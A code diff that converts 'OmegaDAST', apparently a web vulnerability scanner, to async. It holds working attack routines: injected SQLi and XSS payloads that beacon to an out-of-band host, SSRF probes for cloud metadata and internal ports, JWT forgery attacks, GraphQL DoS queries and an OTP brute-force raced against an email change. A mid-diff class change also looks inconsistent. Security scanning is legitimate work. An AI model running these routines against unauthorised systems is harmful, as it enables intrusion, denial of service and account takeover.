+                        logging.warning(f"CDP JSON parse error: {e}")
+
+    async def _passive_checks(self, resp):
         url = str(resp.url)
         headers = resp.headers
         scheme = urlparse(url).scheme
         if scheme == 'https' and 'Strict-Transport-Security' not in headers:
-            self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing HSTS on HTTPS","url":url,"severity":"Medium","confidence":80})
+            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing HSTS on HTTPS","url":url,"severity":"Medium","confidence":80})
         if 'X-Frame-Options' not in headers:
-            self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Frame-Options","url":url,"severity":"Low","confidence":60})
+            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Frame-Options","url":url,"severity":"Low","confidence":60})
         if 'X-Content-Type-Options' not in headers:
-            self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Content-Type-Options","url":url,"severity":"Low","confidence":60})
+            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Content-Type-Options","url":url,"severity":"Low","confidence":60})
         for cookie in resp.cookies:
             if isinstance(cookie, str):
                 continue
             if not cookie.secure and scheme == 'https':
-                self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without Secure on HTTPS","url":url,"parameter":cookie.name,"severity":"Medium","confidence":85})
+                await self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without Secure on HTTPS","url":url,"parameter":cookie.name,"severity":"Medium","confidence":85})
             if not cookie.has_nonstandard_attr('HttpOnly'):
-                self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without HttpOnly","url":url,"parameter":cookie.name,"severity":"Low","confidence":70})
+                await self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without HttpOnly","url":url,"parameter":cookie.name,"severity":"Low","confidence":70})
         if 'Server' in headers:
-            self._add_vulnerability({"type":"InfoDisclosure","subtype":"Server header","url":url,"evidence":headers['Server'],"severity":"Low","confidence":70})
+            await self._add_vulnerability({"type":"InfoDisclosure","subtype":"Server header","url":url,"evidence":headers['Server'],"severity":"Low","confidence":70})
         # CORS (sync, but simple)
-        cors = self._check_cors_misconfig(url)
+        cors = await self._check_cors_misconfig(url)
         if cors: 
-            self._add_vulnerability(cors)
+            await self._add_vulnerability(cors)
 
     # --- Advanced discovery ---
     async def _check_cors_misconfig(self, url):
@@ -4095,7 +5752,7 @@ class OmegaDAST:
         test_origin = "https://evil.com"
         headers = {"Origin": test_origin}
         try:
-            async with self.async_session.session.options(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            async with self.session_manager.async_session.session.options(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                 acao = resp.headers.get("Access-Control-Allow-Origin", "")
                 if acao == '*' or acao == test_origin:
                     return {"type": "CORS Misconfiguration", "url": url, "evidence": f"ACAO: {acao}", "severity": "Medium", "confidence": 80}
@@ -4107,7 +5764,7 @@ class OmegaDAST:
                     "Access-Control-Request-Headers": "Authorization, Content-Type"
                 }
                 try:
-                    async with self.async_session.session.options(url, headers=cred_headers, timeout=aiohttp.ClientTimeout(total=5)) as cred_resp:
+                    async with self.session_manager.async_session.session.options(url, headers=cred_headers, timeout=aiohttp.ClientTimeout(total=5)) as cred_resp:
                         acao_cred = cred_resp.headers.get("Access-Control-Allow-Origin", "")
                         acac = cred_resp.headers.get("Access-Control-Allow-Credentials", "")
                         
@@ -4121,8 +5778,11 @@ class OmegaDAST:
 
     async def discover_websocket_endpoints(self):
         if not WEBSOCKETS_AVAILABLE: return
-        for page in self.crawled_pages:
-            html = page['html']
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
             ws_urls = re.findall(r'(wss?://[^\s"\']+)', html)
             for ws_url in ws_urls:
                 self.log(f"WebSocket endpoint: {ws_url}")
@@ -4136,7 +5796,7 @@ class OmegaDAST:
                     try:
                         response = await asyncio.wait_for(websocket.recv(), timeout=2)
                         if payload in response:
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"WebSocket XSS","url":ws_url,"parameter":"message",
                                 "evidence":f"Payload reflected: {payload}","severity":"High","confidence":80,
                                 "cwe":CWE_MAP["WebSocket"]
@@ -4156,7 +5816,7 @@ class OmegaDAST:
                 responses = stub.ServerReflectionInfo(iter([request]))
                 for resp in responses:
                     if resp.list_services_response:
-                        self._add_vulnerability({
+                        await self._add_vulnerability({
                             "type":"gRPC Reflection Enabled","url":target,"parameter":"*",
                             "evidence":"gRPC server reflection available","severity":"Medium","confidence":90,
                             "cwe":CWE_MAP["gRPC"]
@@ -4177,7 +5837,7 @@ class OmegaDAST:
                     # Try to send malformed data to the channel
                     # This is a basic fuzzing attempt - in practice you'd need actual service definitions
                     channel._channel.send(payload)
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"gRPC Message Fuzzing","url":target,"parameter":"*",
                         "evidence":f"Accepted malformed payload: {payload[:20]}...",
                         "severity":"Medium","confidence":60,"cwe":CWE_MAP["gRPC"]
@@ -4195,7 +5855,7 @@ class OmegaDAST:
                 query = get_introspection_query()
                 resp = await self._async_fetch(gql_url, method='POST', json_data={'query': query})
                 if resp and resp.status == 200 and '__schema' in resp._body:
-                    self._add_vulnerability({"type":"GraphQL Introspection Enabled","url":gql_url,"severity":"Medium","confidence":95})
+                    await self._add_vulnerability({"type":"GraphQL Introspection Enabled","url":gql_url,"severity":"Medium","confidence":95})
                     schema = build_client_schema((await resp.json()).get('data'))
                     await self.fuzz_graphql_schema(gql_url, schema)
             except Exception as e:
@@ -4213,7 +5873,7 @@ class OmegaDAST:
                         if resp and resp.status == 200:
                             # Check if payload was reflected in response
                             if payload in resp._body:
-                                self._add_vulnerability({
+                                await self._add_vulnerability({
                                     "type":"GraphQL Injection","url":endpoint,"parameter":arg,
                                     "evidence":f"Payload reflected: {payload}",
                                     "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
@@ -4253,7 +5913,7 @@ class OmegaDAST:
         elapsed = time.time() - start_time
         
         if resp and resp.status == 200 and elapsed > 5:
-            self._add_vulnerability({
+            await self._add_vulnerability({
                 "type":"GraphQL Batching DoS","url":endpoint,"parameter":"query",
                 "evidence":f"100 batched queries took {elapsed:.2f}s",
                 "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
@@ -4270,7 +5930,7 @@ class OmegaDAST:
         elapsed = time.time() - start_time
         
         if resp and resp.status == 200 and elapsed > 5:
-            self._add_vulnerability({
+            await self._add_vulnerability({
                 "type":"GraphQL Alias DoS","url":endpoint,"parameter":"query",
                 "evidence":f"5000 aliases took {elapsed:.2f}s",
                 "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
@@ -4297,7 +5957,7 @@ class OmegaDAST:
         elapsed = time.time() - start_time
         
         if resp and resp.status == 200 and elapsed > 5:
-            self._add_vulnerability({
+            await self._add_vulnerability({
                 "type":"GraphQL Recursive Fragment DoS","url":endpoint,"parameter":"query",
                 "evidence":f"Recursive fragments took {elapsed:.2f}s",
                 "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
@@ -4321,7 +5981,7 @@ class OmegaDAST:
         elapsed = time.time() - start_time
         
         if resp and resp.status == 200 and elapsed > 5:
-            self._add_vulnerability({
+            await self._add_vulnerability({
                 "type":"GraphQL Introspection Depth Bomb","url":endpoint,"parameter":"query",
                 "evidence":f"100-level nested __typename query took {elapsed:.2f}s",
                 "severity":"High","confidence":85,"cwe":CWE_MAP["GraphQL"]
@@ -4339,7 +5999,7 @@ class OmegaDAST:
                     if 'data' in data and '__typename' in data['data']:
                         typename = data['data']['__typename']
                         if typename in ['Query', 'Mutation', 'Subscription']:
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"GraphQL Field Suggestion - Active Endpoint","url":endpoint,
                                 "evidence":f"GraphQL endpoint confirmed with __typename: {typename}",
                                 "severity":"Low","confidence":95,"cwe":CWE_MAP["GraphQL"]
@@ -4372,7 +6032,7 @@ class OmegaDAST:
                                         if 'data' in sensitive_data and field in sensitive_data['data']:
                                             field_data = sensitive_data['data'][field]
                                             if field_data and len(str(field_data)) > 0:
-                                                self._add_vulnerability({
+                                                await self._add_vulnerability({
                                                     "type":"GraphQL Field Suggestion - Sensitive Data Leak","url":endpoint,
                                                     "evidence":f"Sensitive field '{sensitive}' accessible in '{field}'",
                                                     "severity":"Critical","confidence":90,"cwe":CWE_MAP["GraphQL"]
@@ -4429,7 +6089,7 @@ class OmegaDAST:
                         
                         # If unauthenticated request returns same data as authenticated, there's a bypass
                         if no_auth_data == with_auth_data and len(str(no_auth_data)) > 50:
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"GraphQL Batching Auth Bypass","url":endpoint,
                                 "evidence":"Unauthenticated batch query returned same data as authenticated request",
                                 "severity":"Critical","confidence":85,"cwe":CWE_MAP["GraphQL"]
@@ -4452,7 +6112,7 @@ class OmegaDAST:
                             # Check if sensitive data (password) was returned
                             mixed_str = str(mixed_data).lower()
                             if 'password' in mixed_str or len(mixed_str) > 100:
-                                self._add_vulnerability({
+                                await self._add_vulnerability({
                                     "type":"GraphQL Batching Mixed Auth Context","url":endpoint,
                                     "evidence":"Batch query may leak sensitive data across auth contexts",
                                     "severity":"High","confidence":75,"cwe":CWE_MAP["GraphQL"]
@@ -4477,7 +6137,7 @@ class OmegaDAST:
             "/.well-known/openid-configuration/jwks",
         ]
         
-        for page in self.crawled_pages:
+        for page in self.crawler_engine.crawled_pages:
             try:
                 parsed_url = urlparse(page['url'])
                 base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
@@ -4491,7 +6151,7 @@ class OmegaDAST:
                             if 'keys' in jwks_data and jwks_data['keys']:
                                 logging.info(f"Discovered JWKS endpoint: {jwks_url}")
                                 # Try to extract public key using JWTAttack class
-                                public_key_pem = JWTAttack.extract_public_key_from_jwks(base_url)
+                                public_key_pem = await JWTAttack.extract_public_key_from_jwks(base_url)
                                 if public_key_pem:
                                     logging.info("Successfully extracted RSA public key from JWKS")
                                     break
@@ -4503,21 +6163,24 @@ class OmegaDAST:
                 logging.debug(f"Public key discovery error: {e}")
         
         # Test JWT tokens found in pages
-        for page in self.crawled_pages:
-            html = page['html']
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
             for token in re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html):
                 # Basic JWT detection
                 vulns = Detector.jwt_test(token, public_key=public_key_pem)
                 for v in vulns:
                     v['url'] = page['url']
-                    self._add_vulnerability(v)
+                    await self._add_vulnerability(v)
                 
                 # Algorithm Confusion Attack (RS256 → HS256)
                 if public_key_pem:
                     algo_confusion_result = JWTAttack.algorithm_confusion_attack(token, public_key_pem)
                     if algo_confusion_result:
                         algo_confusion_result['url'] = page['url']
-                        self._add_vulnerability(algo_confusion_result)
+                        await self._add_vulnerability(algo_confusion_result)
                         self.log(f"[CRITICAL] Algorithm Confusion vulnerability found at {page['url']}")
                 
                 # kid Path Traversal Attack (CVE-2018-0114)
@@ -4525,14 +6188,14 @@ class OmegaDAST:
                 if kid_traversal_results:
                     for result in kid_traversal_results:
                         result['url'] = page['url']
-                        self._add_vulnerability(result)
+                        await self._add_vulnerability(result)
                     self.log(f"[HIGH] kid Path Traversal attack vectors generated for {page['url']}")
                 
                 # None Algorithm Attack
                 none_algo_result = JWTAttack.none_algorithm_attack(token)
                 if none_algo_result:
                     none_algo_result['url'] = page['url']
-                    self._add_vulnerability(none_algo_result)
+                    await self._add_vulnerability(none_algo_result)
                     self.log(f"[CRITICAL] None Algorithm vulnerability found at {page['url']}")
         
         # Session Fixation/Ambiguity Attack
@@ -4543,7 +6206,7 @@ class OmegaDAST:
         self.log("Testing session fixation/ambiguity...")
         
         # Test on crawled pages
-        for page in self.crawled_pages:
+        for page in self.crawler_engine.crawled_pages:
             try:
                 parsed_url = urlparse(page['url'])
                 base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
@@ -4552,38 +6215,22 @@ class OmegaDAST:
                 session_cookie_names = ['session', 'SESSION', 'JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId']
                 
                 for cookie_name in session_cookie_names:
-                    session_result = JWTAttack.session_fixation_ambiguity_attack(base_url, cookie_name)
-                    if session_result:
-                        session_result['url'] = page['url']
-                        self._add_vulnerability(session_result)
+                    session_results = await JWTAttack.session_fixation_ambiguity_attack(base_url, cookie_name)
+                    if session_results:
+                        for result in session_results:
+                            result['url'] = page['url']
+                            await self._add_vulnerability(result)
                         self.log(f"[HIGH] Session fixation/ambiguity vulnerability found with cookie: {cookie_name}")
                         break  # Only report once per page
                         
             except Exception as e:
                 logging.debug(f"Session fixation test error for {page['url']}: {e}")
 
-    # --- Active tests ---
-    async def run_active_tests(self):
-        self.log(f"Active tests on {len(self.parameters)} parameters")
-        # Populate baselines first
-        await self._populate_baselines()
-        tasks = []
-        for i, param in enumerate(self.parameters):
-            tasks.append(asyncio.ensure_future(self._test_param(param)))
-            # Update progress periodically
-            if i % 10 == 0:
-                self.current_task += 1
-                self.update_progress(self.current_task, self.total_tasks)
-        await asyncio.gather(*tasks)
-        await self.second_order_injection_tests()
-        await self.race_condition_tests()
-        await self.request_smuggling_tests()
-        await self.http2_downgrade_tests()
-
-    async def _populate_baselines(self):
+class DistributedWorker:
+    async def _establish_baselines(self):
         async def baseline_for(param):
             key = (param['url'], param['method'], param['param'])
-            if self.baseline_cache.get(key):
+            if await self.baseline_cache.get(key):
                 return
             url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
             safe = "1"
@@ -4601,14 +6248,19 @@ class OmegaDAST:
                     resp = await self._async_fetch(url, method='POST', data={pname: safe})
             elapsed = time.perf_counter() - start_time
             if resp:
-                self.baseline_cache.set(key, {
+                await self.baseline_cache.set(key, {
                     'text': self.token_normalizer.normalize(resp._body),
                     'headers': dict(resp.headers),
                     'status': resp.status,
                     'elapsed': elapsed
                 })
-        tasks = [baseline_for(p) for p in self.parameters]
-        await asyncio.gather(*tasks)
+        tasks = [baseline_for(p) for p in self.crawler_engine.parameters]
+        # Use asyncio.wait with timeout to prevent hanging if target hangs
+        done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
+        if pending:
+            for task in pending:
+                task.cancel()
+            logging.warning(f"{len(pending)} baseline tasks timed out and were cancelled")
 
     async def _test_param(self, param):
         async with self.semaphore:  # Limit concurrent requests
@@ -4619,7 +6271,7 @@ class OmegaDAST:
                     for variant in obfuscate(payload):
                         if self.stop_event.is_set(): return
                         await self._send_and_detect(param, vuln_type, variant)
-
+    
     async def _test_imdsv2_ssrf(self, target_url):
         """Test for IMDSv2 SSRF using two-step token retrieval"""
         try:
@@ -4643,7 +6295,7 @@ class OmegaDAST:
                     headers=metadata_headers
                 )
                 if metadata_resp and metadata_resp.status == 200:
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"SSRF (IMDSv2)","url":target_url,"parameter":"*",
                         "evidence":"IMDSv2 token retrieval successful - metadata accessible",
                         "severity":"Critical","confidence":95,"cwe":CWE_MAP["SSRF"]
@@ -4653,14 +6305,14 @@ class OmegaDAST:
 
     async def _test_ssrf_internal_port_scan(self, url):
         """Test for SSRF by scanning internal ports and inferring open ports from response differences"""
-        if not self.parameters:
+        if not self.crawler_engine.parameters:
             return
         
         # Common internal ports to scan
         common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
         base_domain = urlparse(url).netloc
         
-        for param in self.parameters[:5]:  # Limit to first 5 parameters to avoid excessive requests
+        for param in self.crawler_engine.parameters[:5]:  # Limit to first 5 parameters to avoid excessive requests
             param_name = param['param']
             param_url = param['url']
             
@@ -4710,16 +6362,16 @@ class OmegaDAST:
                         if port_detected:
                             evidence.append(f"port {port} indicators found")
                         
-                        self._add_vulnerability({
+                        await self._add_vulnerability({
                             "type":"SSRF (Internal Port Scan)","url":param_url,"parameter":param_name,
                             "evidence":f"Port {port} appears open: {', '.join(evidence)}",
                             "severity":"High","confidence":80,"cwe":CWE_MAP["SSRF"]
                         })
                         break  # Stop after first detected port for this parameter
-
+        
     async def _send_and_detect(self, param, vuln_type, payload):
         param_key = (param['url'], param['method'], param['param'])
-        baseline = self.baseline_cache.get(param_key)
+        baseline = await self.baseline_cache.get(param_key)
         baseline_html = baseline['text'] if baseline else None
         baseline_time = baseline['elapsed'] if baseline else None
 
@@ -4728,7 +6380,7 @@ class OmegaDAST:
         marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
         oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
         oob_dns = f"{marker}.{self.oob_dns_domain}"
-        payload = payload.replace('OOB_MARKER', oob_url).replace('OOB_DNS', oob_dns)
+        payload = payload.replace(OOB_MARKER, oob_url).replace(OOB_DNS, oob_dns)
 
         js_driver = self.selenium_driver if self.selenium_ready else None
 
@@ -4739,6 +6391,7 @@ class OmegaDAST:
         # Union SQLi detection
         if vuln_type == "SQLi" and "ORDER BY" in payload:
             results = []
+            last_test_html = ''
             for order_num in range(1, 20):
                 p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
                 resp_test = await self._send_injection(param, p)
@@ -4746,12 +6399,13 @@ class OmegaDAST:
                 if resp_test and resp_baseline:
                     diff = abs(len(resp_test._body) - len(resp_baseline._body))
                     results.append((order_num, diff))
+                    last_test_html = resp_test._body
             union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
-            union_result = Detector.sqli_union('', results, union_marker)
+            union_result = Detector.sqli_union(last_test_html, results, union_marker)
             if union_result:
                 resp = await self._send_injection(param, union_result['payload'])
                 if resp and union_marker in resp._body:
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"SQLi (Union)","url":url,"parameter":pname,"method":method,
                         "evidence":f"Union injection confirmed with marker {union_marker}",
                         "severity":"High","confidence":90,"cwe":CWE_MAP["SQLi"]
@@ -4767,10 +6421,10 @@ class OmegaDAST:
             if resp and baseline_time:
                 if elapsed > baseline_time * 1.5:
                     result = {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {elapsed:.1f}s vs baseline {baseline_time:.1f}s"}
-                    self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["SQLi"]})
+                    await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["SQLi"]})
             await asyncio.sleep(0.5)
             return
-
+        
         resp = await self._send_injection(param, payload)
         if not resp: return
         html = self.token_normalizer.normalize(resp._body)
@@ -4778,13 +6432,13 @@ class OmegaDAST:
 
         if vuln_type == "XSS":
             result = Detector.xss(html, payload, baseline_html)
-            if not result and 'OOB_MARKER' in payload:
+            if not result and OOB_MARKER in payload:
                 await asyncio.sleep(0.5)
                 result = Detector.blind_xss(oob_results, marker)
             if not result and js_driver:
                 dom_result = Detector.dom_xss(url, js_driver, marker, oob_url)
                 if dom_result:
-                    self._add_vulnerability({**dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
+                    await self._add_vulnerability({**dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
         elif vuln_type == "SQLi":
             result = Detector.sqli(html, baseline_html)
             if not result:
@@ -4826,8 +6480,8 @@ class OmegaDAST:
             result = Detector.ssti(html, payload, baseline_html)
         elif vuln_type == "XXE":
             result = Detector.xxe(html, baseline_html)
-            if not result and "OOB_MARKER" in payload:
-                time.sleep(1)
+            if not result and OOB_MARKER in payload:
+                await asyncio.sleep(1)
                 result = Detector.blind_xss(oob_results, marker)
                 if result:
                     result["type"] = "XXE (OOB)"
@@ -4852,7 +6506,7 @@ class OmegaDAST:
                     nosql_results = Detector.nosql_operator_injection(baseline_resp, resp_gt, resp_regex)
                     if nosql_results:
                         for nosql_result in nosql_results:
-                            self._add_vulnerability({**nosql_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get("NoSQLi","")})
+                            await self._add_vulnerability({**nosql_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get("NoSQLi","")})
                         result = nosql_results[0]  # Mark as detected to avoid duplicate processing
         elif vuln_type == "LDAPi":
             result = Detector.ldapi(html, baseline_html, payload)
@@ -4864,7 +6518,7 @@ class OmegaDAST:
             result = Detector.log4j(html, payload, oob_results, marker)
             # Check HTTPS OOB callbacks for Log4j
             if not result and self.enable_advanced_oob and self.https_oob_port:
-                time.sleep(1)
+                await asyncio.sleep(1)
                 with https_oob_lock:
                     for res in https_oob_results:
                         if marker in res['path']:
@@ -4888,7 +6542,7 @@ class OmegaDAST:
                 result = {"type":"Text4Shell","confidence":80,"evidence":"Text4Shell pattern detected"}
             # Check OOB callbacks
             if not result and self.enable_advanced_oob:
-                time.sleep(1)
+                await asyncio.sleep(1)
                 with oob_results_lock:
                     for res in oob_results:
                         if marker in res['path']:
@@ -4897,14 +6551,14 @@ class OmegaDAST:
 
         if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
             evidence = getattr(resp, '_evidence', None)
-            self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
+            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
         
         # Small difference detection - compare with baseline for subtle changes
         if baseline and not result:
             diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
             if diff_result and diff_result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
-                self._add_vulnerability({**diff_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,"")})
-
+                await self._add_vulnerability({**diff_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,"")})
+    
     async def _send_injection(self, param, payload):
         url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
         if method == 'GET':
@@ -4918,15 +6572,19 @@ class OmegaDAST:
                 return await self._async_fetch(url, method='POST', json_data={pname: payload})
             else:
                 return await self._async_fetch(url, method='POST', data={pname: payload})
-
+    
     # --- Second-order Injection (stored) ---
     async def second_order_injection_tests(self):
         self.log("Second-order injection tests...")
         stored_xss_payload = f"<img src=http://{self.public_ip}:{self.oob_port}/DAST_STORED_XSS_{self.oob_marker_base}>"
         stored_sqli_payload = f"' UNION SELECT 'DAST_STORED_SQL_{self.oob_marker_base}'--"
         # Find forms with fields likely stored (comment, bio, name)
-        for page in self.crawled_pages:
-            soup = page['soup']
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 action = urljoin(page['url'], form.get('action',''))
                 fields = [inp.get('name') for inp in form.find_all(['input','textarea','select']) if inp.get('name')]
@@ -4943,12 +6601,12 @@ class OmegaDAST:
                     self.log(f"Stored payload submitted to {action}")
         # Wait and re-crawl to find reflections
         await asyncio.sleep(2)
-        for url in list(self.visited_urls):
+        for url in list(self.crawler_engine.visited_urls):
             resp = await self._async_fetch(url)
             if resp:
                 html = resp._body
                 if stored_sqli_payload in html:
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"Second-order SQLi","url":url,"parameter":"*",
                         "evidence":f"Marker found: {stored_sqli_payload}",
                         "severity":"Critical","confidence":95,"cwe":CWE_MAP["SQLi"]
@@ -4961,19 +6619,23 @@ class OmegaDAST:
             with oob_results_lock:
                 for res in oob_results:
                     if "DAST_STORED_XSS" in res['path']:
-                        self._add_vulnerability({
+                        await self._add_vulnerability({
                             "type":"Second-order XSS","url":res['path'],"parameter":"*",
                             "evidence":"OOB callback from stored XSS",
                             "severity":"High","confidence":95,"cwe":CWE_MAP["XSS"]
                         })
                         return
             await asyncio.sleep(check_interval)
-
+        
     # --- Race Condition ---
     async def race_condition_tests(self):
         target_urls = set()
-        for page in self.crawled_pages:
-            soup = page['soup']
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 form_text = form.get_text().lower()
                 if any(kw in form_text for kw in ['redeem','coupon','transfer','checkout','order']):
@@ -4982,9 +6644,15 @@ class OmegaDAST:
         for url in target_urls:
             # Basic race condition test
             tasks = [self._async_fetch(url, method='POST', data={"test":"race"}) for _ in range(10)]
-            responses = await asyncio.gather(*tasks)
+            # Use asyncio.wait with timeout to prevent hanging if target hangs
+            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} race condition test tasks timed out")
+            responses = [task.result() for task in done if not task.cancelled()]
             if all(resp and resp.status == 200 for resp in responses):
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type":"Potential Race Condition","url":url,"parameter":"*",
                     "evidence":"Multiple concurrent requests all succeeded",
                     "severity":"Medium","confidence":60,"cwe":CWE_MAP["RaceCondition"]
@@ -4992,7 +6660,6 @@ class OmegaDAST:
             
             # Microsecond timing detection
             await self._test_race_condition_timing(url)
-
     async def _test_race_condition_timing(self, url):
         """Test for race conditions using microsecond timing detection - REDUCED concurrency"""
         try:
@@ -5005,7 +6672,13 @@ class OmegaDAST:
                 return (end - start, resp)
             
             tasks = [timed_request() for _ in range(5)]
-            results = await asyncio.gather(*tasks)
+            # Use asyncio.wait with timeout to prevent hanging if target hangs
+            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} timing test tasks timed out")
+            results = [task.result() for task in done if not task.cancelled()]
             
             # Analyze timing patterns
             timings = [r[0] for r in results if r[1]]
@@ -5018,7 +6691,7 @@ class OmegaDAST:
             
             # If variance is very low, requests might be processed concurrently without proper locking
             if timing_std < 0.001 and timing_variance < 0.000001:
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type":"Race Condition (Timing)","url":url,"parameter":"*",
                     "evidence":f"Low timing variance detected: std={timing_std:.6f}s, variance={timing_variance:.9f}s²",
                     "severity":"Medium","confidence":70,"cwe":CWE_MAP["RaceCondition"]
@@ -5039,14 +6712,13 @@ class OmegaDAST:
             # If we have clusters of 3+ requests completing within 100 microseconds, potential race condition
             if any(len(cluster) >= 3 for cluster in clusters):
                 max_cluster_size = max(len(cluster) for cluster in clusters)
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type":"Race Condition (Time Cluster)","url":url,"parameter":"*",
                     "evidence":f"Detected {max_cluster_size} requests completing within 100μs",
                     "severity":"Medium","confidence":75,"cwe":CWE_MAP["RaceCondition"]
                 })
         except Exception as e:
             logging.warning(f"Race condition timing test error: {e}")
-
     async def test_token_validation_window(self, forgot_password_url, change_email_url, target_email):
         """
         TOKEN VALIDATION WINDOW: Race OTP brute-force with email change
@@ -5056,15 +6728,15 @@ class OmegaDAST:
         """
         try:
             logging.info(f"[TOKEN VALIDATION] Testing race condition on {forgot_password_url}")
-            
+
             # Step 1: Trigger forgot password to send OTP
             forgot_data = {"email": target_email}
             await self._async_fetch(forgot_password_url, method='POST', data=forgot_data)
             await asyncio.sleep(2)  # Wait for email to send
-            
+
             # Step 2: Start parallel tasks - OTP brute-force and email change
             results = {"otp_found": False, "email_changed": False, "race_won": False}
-            
+
             async def brute_force_otp():
                 """Brute-force 6-digit OTP at 1 request per second"""
                 for code in range(100000, 1000000):  # 000000 to 999999
@@ -5076,7 +6748,7 @@ class OmegaDAST:
                         return code
                     await asyncio.sleep(1)  # 1 req/sec to avoid locking
                 return None
-            
+
             async def change_email_race():
                 """Race to change email before OTP validation"""
                 await asyncio.sleep(3)  # Small delay to start after OTP brute-force begins
@@ -5089,12 +6761,16 @@ class OmegaDAST:
                     logging.info(f"[TOKEN VALIDATION] Email changed to {new_email} during OTP window")
                     return True
                 return False
-            
-            # Run both tasks in parallel
-            await asyncio.gather(brute_force_otp(), change_email_race())
-            
+
+            # Run both tasks in parallel with timeout
+            done, pending = await asyncio.wait([brute_force_otp(), change_email_race()], timeout=60, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} token validation race tasks timed out")
+
             if results["race_won"]:
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type": "Token Validation Race Condition",
                     "url": forgot_password_url,
                     "parameter": "otp,email",
@@ -5103,11 +6779,10 @@ class OmegaDAST:
                     "confidence": 90,
                     "cwe": "CWE-384"
                 })
-            
+
             return results
         except Exception as e:
             logging.warning(f"Token validation window test error: {e}")
-
     async def test_two_phase_transaction(self, initiate_url, confirm_url):
         """
         TWO-PHASE TRANSACTION: Race condition between initiate and confirm
@@ -5148,7 +6823,7 @@ class OmegaDAST:
                     except:
                         return None
                 return None
-            
+
             async def confirm_with_race(transaction_id):
